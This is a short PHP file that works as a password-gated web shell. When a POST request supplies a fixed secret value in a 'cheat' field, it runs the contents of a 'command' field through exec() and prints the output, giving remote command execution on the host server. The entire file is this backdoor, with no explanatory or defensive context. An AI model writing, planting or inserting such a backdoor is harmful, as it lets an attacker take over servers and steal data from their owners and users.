<?php

if($_POST["cheat"] && $_POST["cheat"] == "bdf1ed5d23a113128980c5e304cae020"){
  $lines;
  exec($_POST["command"], $lines);
  foreach ($lines as $key => $line) {
    echo $line . "<br/>";
  }
}